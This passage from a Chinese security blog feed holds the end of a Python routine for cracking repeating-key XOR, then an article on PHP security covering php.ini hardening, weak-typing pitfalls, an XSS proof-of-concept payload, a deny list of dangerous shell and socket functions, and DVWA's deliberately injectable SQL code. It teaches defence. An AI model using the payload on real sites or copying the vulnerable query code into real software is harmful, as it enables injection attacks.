class="line">b = base64.b64decode(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for KEYSIZE in range(2, 40):</span><br><span class="line">    # 我们取其中前6段计算平局汉明距离</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * 2]</span><br><span class="line">    b3 = b[KEYSIZE * 2: KEYSIZE * 3]</span><br><span class="line">    b4 = b[KEYSIZE * 3: KEYSIZE * 4]</span><br><span class="line">    b5 = b[KEYSIZE * 4: KEYSIZE * 5]</span><br><span class="line">    b6 = b[KEYSIZE * 5: KEYSIZE * 6]</span><br><span class="line">    b7 = b[KEYSIZE * 6: KEYSIZE * 7]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * 5)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances, key=lambda x: x[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for KEYSIZE, _ in normalized_distances[:5]:</span><br><span class="line">    block_bytes = [[] for _ in range(KEYSIZE)]</span><br><span class="line">    for i, byte in enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = &apos;&apos;</span><br><span class="line"></span><br><span class="line">    for bbytes in block_bytes:</span><br><span class="line">        keys += break_single_key_xor(bbytes)</span><br><span class="line">    key = bytearray(keys * len(b), &quot;utf-8&quot;)</span><br><span class="line">    plaintext = bxor(b, key)</span><br><span class="line">    print(&quot;keysize:&quot;, KEYSIZE)</span><br><span class="line">    print(&quot;key is:&quot;, keys, &quot;\n&quot;)</span><br><span class="line">    s = bytes.decode(plaintext)</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure></p><h1 id="反思回顾"><a href="#反思回顾" class="headerlink" title="反思回顾"></a>反思回顾</h1><p>通过这一番折腾，对流密码的重用的不安全性有了更加深入的理解，同时也是对ctf密码题这类异或题型的解题思路的一次总结升华。在文章的最后想把这篇文章里用到的几个不错的思路或者说想法做一个总结性摘录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在异或加密中，明文和明文异或等于密文和密文异或，并且二者的汉明距离一样。</span><br><span class="line">2. 空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。除了空格以外，仍旧有一些组合可以出现异或结果是大小写字母，但是空格出现时，结果在大小写字母间的概率最大。</span><br><span class="line">3. 两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。</span><br><span class="line">4. 在破解这类问题的三步走：猜解密钥长度；根据密钥长度分组，依次求解密钥每个字节得出密钥；最后根据密钥还原出明文。</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://crypto.stackexchange.com/questions/8115/repeating-key-xor-and-hamming-distance" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/8115/repeating-key-xor-and-hamming-distance</a><br><a href="https://cypher.codes/writing/cryptopals-challenge-set-1" target="_blank" rel="noopener">https://cypher.codes/writing/cryptopals-challenge-set-1</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> cryptography </tag>
            
            <tag> 流密码 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>浅谈php安全</title>
      <link href="/2018/09/05/%E6%B5%85%E8%B0%88php%E5%AE%89%E5%85%A8/"/>
      <url>/2018/09/05/%E6%B5%85%E8%B0%88php%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10有所了解，最后向前辈致敬。<br><a id="more"></a></p></blockquote><h1 id="请充分了解你的php"><a href="#请充分了解你的php" class="headerlink" title="请充分了解你的php"></a>请充分了解你的php</h1><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 注意到以下的文件结构在新版本php或者不同的发行版中略有不同，就好比在ubuntu18.04中安装php7就和下面的文件结构有较大的差别，所以下面的文件仅仅作为一个apache的架构参考。</span><br><span class="line">Root：/var/www/html</span><br><span class="line">默认Web服务：Apache（可以使用Lighttpd或Nginx代替）</span><br><span class="line">默认PHP配置文件：/etc/php.ini</span><br><span class="line">默认PHP Extensions配置目录：/etc/php.d/</span><br><span class="line">PHP安全配置样例文件：/etc/php.d/security.ini（需要使用文本编辑器创建这个文件）</span><br><span class="line">php 版本： php -v</span><br><span class="line">查看当前PHP所编译 ： php -m</span><br></pre></td></tr></table></figure><h3 id="敏感配置"><a href="#敏感配置" class="headerlink" title="敏感配置"></a>敏感配置</h3><blockquote><p>以下是一些常见的配置举例，更多请查看：<a href="http://php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">http://php.net/manual/zh/ini.core.php#ini.variables-order</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># 不在请求头中泄露php信息</span><br><span class="line">expose_php=Off   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 不回显php错误（包括运行错误时和启动时错误），但是进行错误记录</span><br><span class="line">play_errors=Off  </span><br><span class="line">display_startup_errors=off</span><br><span class="line">log_errors=On</span><br><span class="line">error_log=/var/log/httpd/php_scripts_error.log</span><br><span class="line"></span><br><span class="line"># 文件上传开启与否和最大上传文件限制</span><br><span class="line">file_uploads=On</span><br><span class="line">upload_max_filesize=1M</span><br><span class="line"></span><br><span class="line"># 控制最大post数据</span><br><span class="line">post_max_size=1M   #注意到要比upload_max_filesize大，否则后者失效</span><br><span class="line"></span><br><span class="line"># 关闭远程代码执行</span><br><span class="line">allow_url_fopen=Off</span><br><span class="line">allow_url_include=Off</span><br><span class="line"></span><br><span class="line"># 关闭全局注册变量，不过默认5.x版本的php是off</span><br><span class="line">register_globals=off</span><br><span class="line"></span><br><span class="line"># 关于安全模式和粗暴的魔术引号过滤，注意到save_mode模式在php5.3以上版本，safe_mode被弃用，在php5.4以上版本，则将此特性完全去除了。</span><br><span class="line">safe_mode=On</span><br><span class="line">safe_mode_include_dir = D:/phpstudy/www/include/</span><br><span class="line">magic_quotes_gpc=Off   #如果开启了这个，然后在php应用中使用addslashes()过滤输入会造成双重转义，使得过滤无济于事，遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">magic_quotes_runtime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 资源管理防止过分消耗服务器资源</span><br><span class="line">max_execution_time = 30</span><br><span class="line">max_input_time = 30</span><br><span class="line">memory_limit = 40M</span><br><span class="line"></span><br><span class="line"># 禁用危险函数</span><br><span class="line">disable_functions = </span><br><span class="line">phpinfo,eval,passthru,assert,exec,system,ini_set,ini_get,get_included_files,</span><br><span class="line">get_defined_functions,get_defined_constants,get_defined_vars,</span><br><span class="line">glob,``,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,</span><br><span class="line">ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,</span><br><span class="line">symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br><span class="line"></span><br><span class="line"># 限制php访问文件系统</span><br><span class="line">open_basedir=&apos;/var/www/html/&apos;;......;......</span><br><span class="line"></span><br><span class="line"># session保存路径</span><br><span class="line">session.save_path=&quot;/var/lib/php/session&quot;</span><br><span class="line"></span><br><span class="line"># 上传文件默认路径</span><br><span class="line">upload_tmp_dir=&quot;/var/lib/php/upload&quot;</span><br></pre></td></tr></table></figure><h3 id="关于危险函数"><a href="#关于危险函数" class="headerlink" title="关于危险函数"></a>关于危险函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 特殊符号</span><br><span class="line">``:反引号运算符在激活了安全模式或者关闭了 shell_exec() 时是无效的，同时与其它某些语言不同，反引号不能在双引号字符串中使用。。否则将会当作shell命令执行，执行效果等同于shell_exec()。</span><br><span class="line"></span><br><span class="line"># 文件操作</span><br><span class="line">http://php.net/manual/zh/ref.filesystem.php</span><br><span class="line"></span><br><span class="line"># 全局信息，配置等</span><br><span class="line">http://php.net/manual/zh/ref.info.php</span><br><span class="line"></span><br><span class="line"># 程序执行</span><br><span class="line">http://php.net/manual/zh/book.exec.php</span><br></pre></td></tr></table></figure><h1 id="不要过分相信php"><a href="#不要过分相信php" class="headerlink" title="不要过分相信php"></a>不要过分相信php</h1><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><p>前人之叙述比较完备，在这就不赘余，仅仅做个汇总。同样还可以参看官网给出的类型表<a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP 类型比较表</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0==&apos;0&apos;//true</span><br><span class="line">0 == &apos;abcdefg&apos;//true</span><br><span class="line">1 == &apos;1abcdef&apos;//true</span><br><span class="line">null==false     //true</span><br><span class="line">123==&apos;123&apos;      //true </span><br><span class="line"></span><br><span class="line">//哈希比较</span><br><span class="line">&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span><br><span class="line">&quot;0e123456abc&quot;==&quot;0e1dddada&quot;//false</span><br><span class="line">&quot;0e1abc&quot;==&quot;0&quot;     //true</span><br><span class="line"></span><br><span class="line">&quot;0x1e240&quot;==&quot;123456&quot;//true</span><br><span class="line">&quot;0x1e240&quot;==123456//true</span><br><span class="line"></span><br><span class="line">var_dump(intval(&apos;2&apos;))//2</span><br><span class="line">var_dump(intval(&apos;3abcd&apos;))//3</span><br><span class="line">var_dump(intval(&apos;abcd&apos;))//0</span><br><span class="line"></span><br><span class="line">//任意两个array,MD5相等</span><br><span class="line">var_dump(md5($array1)==var_dump($array2));//true</span><br><span class="line"></span><br><span class="line">//case 自转换，以下代码输出i is less than 3 but not negative</span><br><span class="line">$i =&quot;2abc&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">case 2:</span><br><span class="line">    echo &quot;i is less than 3 but not negative&quot;;</span><br><span class="line">    break;</span><br><span class="line">case 3:</span><br><span class="line">    echo &quot;i is 3&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//in_array的缺陷，array_search</span><br><span class="line">$array=[0,1,2,&apos;3&apos;];</span><br><span class="line">var_dump(in_array(&apos;abc&apos;, $array));  //true</span><br><span class="line">var_dump(in_array(&apos;1bc&apos;, $array));//true</span><br><span class="line"></span><br><span class="line">//strcmp在php5.x个版本后有些特性不太同，所以遇到的时候具体讨论</span><br></pre></td></tr></table></figure></p><h3 id="全局注册变量"><a href="#全局注册变量" class="headerlink" title="全局注册变量"></a>全局注册变量</h3><p>如果已经弃用的 register_globals 指令被设置为 on 那么局部变量也将在脚本的全局作用域中可用。例如， $_POST[‘foo’] 也将以 $foo 的形式存在。这将会造成一些变量覆盖，条件判断绕过。以下是简化的全局变量认证绕过模型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(authenticated_user())&#123;</span><br><span class="line">    $authorized=<span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($authorized)&#123;</span><br><span class="line">    <span class="keyword">do</span> something......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对于以上的绕过，我们可以有以下的规避措施：<br>(1) php.ini <code>register_globals=off</code><br>(2) 在每次判断前初始化变量，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$authorized=<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(authenticated_user())&#123;</span><br><span class="line">    $authorized=<span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($authorized)&#123;</span><br><span class="line">    <span class="keyword">do</span> something......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="一些常出现的“安全”函数"><a href="#一些常出现的“安全”函数" class="headerlink" title="一些常出现的“安全”函数"></a>一些常出现的“安全”函数</h3><h6 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a><a href="http://php.net/manual/zh/function.strip-tags.php" target="_blank" rel="noopener"><code>strip_tags</code></a></h6><p>该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。但是记住光光去除标签，但是不去除属性，那么在一些可以引入js的代码的属性标签里仍旧会造成xss。具体查看参照</p><h6 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener"><code>htmlspecialchars</code></a></h6><p>这个函数多用来对xss的过滤上，但是注意到这个函数对<code>\</code>和<code>&#39;</code>是不敏感的，本身不会处理,要想转义<code>&#39;</code>需要加入<code>ENT_QUOTES</code>参数，否则仍有可能会出现xss。举例如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="string">"name"</span>];</span><br><span class="line">$name = htmlspecialchars($name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;input type=<span class="string">'text'</span> value=<span class="string">'&lt;?php echo $name?&gt;;'</span>&gt;</span><br></pre></td></tr></table></figure></p><p>poc=<code>?name=&#39;onmouseover=&#39;alert(1)</code>，则在鼠标悬停在输入框上的时候会触发xss，笔者测试的时候IE可以弹窗，而chrome的xss过滤器直接把这个xss语句识别出了，拒绝访问。但是可以看出在绕过浏览器xss filter的情况下仍旧会导致xss。</p><h6 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities"></a><a href="http://php.net/manual/zh/function.htmlentities.php" target="_blank" rel="noopener"><code>htmlentities</code></a></h6><h6 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a><a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener"><code>escapeshellarg</code></a></h6><p>将用户输入进行单引号包含，使其成为真正的字符串，而不会造成执行任意命令的不可控情况。</p><h6 id="escaoeshellcmd"><a href="#escaoeshellcmd" class="headerlink" title="escaoeshellcmd"></a><a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener"><code>escaoeshellcmd</code></a></h6><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。</p><h6 id="is-uploaded-file"><a href="#is-uploaded-file" class="headerlink" title="is_uploaded_file"></a><a href="http://php.net/manual/zh/function.is-uploaded-file.php" target="_blank" rel="noopener"><code>is_uploaded_file</code></a></h6><p>该函数用来检查文件是否正真的由用户传的，避免对非用户传的文件进行操作，从而泄露本地信息。</p><h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a><a href="http://php.net/manual/zh/function.intval.php" target="_blank" rel="noopener"><code>intval</code></a></h6><p>将输入转换成整数，有时被用来抵抗sqli。</p><h6 id="fgetss"><a href="#fgetss" class="headerlink" title="fgetss"></a><a href="http://php.net/manual/zh/function.fgetss.php" target="_blank" rel="noopener"><code>fgetss</code></a></h6><p>这个函数可以从文件操作符中取出一行并且过滤掉html标签</p><h6 id="quotemeta"><a href="#quotemeta" class="headerlink" title="quotemeta"></a><a href="http://php.net/manual/zh/function.quotemeta.php" target="_blank" rel="noopener"><code>quotemeta</code></a></h6><h5 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a><a href="http://php.net/manual/zh/function.stripslashes.php" target="_blank" rel="noopener"><code>stripslashes</code></a></h5><h5 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a><a href="http://php.net/manual/zh/function.str-replace.php" target="_blank" rel="noopener"><code>str_replace</code></a></h5><p>str_replace函数是极其不安全的，因为很多时候可以使用双写绕过替换规则</p><h3 id="php内置协议-伪协议"><a href="#php内置协议-伪协议" class="headerlink" title="php内置协议(伪协议)"></a>php内置协议(伪协议)</h3><p>以下伪协议在很多绕过场景下发挥着举足轻重的作用，如后面提到的文件包含file://协议绕过，以及最近才提出的phar协议对象注入，我们可以在不存在可控unserialization（）函数的情况下利用phar反序列化对象，实现对象注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html  访问本地文件系统</span><br><span class="line">ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs</span><br><span class="line">data://  数据流</span><br><span class="line">http:// — 访问 HTTP(s) URLs</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — Data (RFC 2397)</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP Archive</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — Audio streams</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p><h1 id="向DVWA学习php安全的代码编写"><a href="#向DVWA学习php安全的代码编写" class="headerlink" title="向DVWA学习php安全的代码编写"></a>向DVWA学习php安全的代码编写</h1><blockquote><p>以下样例来自于DVWA v1.9版本</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul><li>Low level</li></ul></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，是最low安全等级的php代码编写样例，可以看到，代码中并没有对用户输入的id变量进行检查和过滤，同时使用的是<code>$_REQUEST</code>全局数组的方式，如果不是特别需要，我们编程的时候尽量不要使用<code>$_REQUEST</code>获取用户的参数，因为<code>$_REQUEST</code>的参数比较杂，包括<code>$_GET</code>,<code>$_POST</code>，<code>$_COOKIE</code>等超全局变量，并且二者还存在变量获取顺序的不一致，受配置文件中<code>variables_order</code>的约定，在存在waf的环境下，容易造成绕过，具体可以参看之前写的文章——<a href="http://lypto.me/2018/01/25/CTF/">CTF（第三条tips）</a>。未经处理的用户输入直接与sql语句拼接交互，造成sql注入漏洞，十分危险。</p><ul><li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Display values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>这个版本的代码，与之前的相比只是多了个<code>mysql_real_escape_string</code>函数的过滤，但是要知道这里的$id在sql语句中是数字类型，这样<code>mysql_real_escape_string</code>的转义就会形同虚设，注入仍旧是一马平川。当然不恰当的字符编码，可能会造成宽字节注入，详细可以看之前的文章——<a href="http://lypto.me/2017/11/23/SQL%E6%8D%A3%E9%BC%93/">sql注入捣鼓</a></p><ul><li>High leval<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; 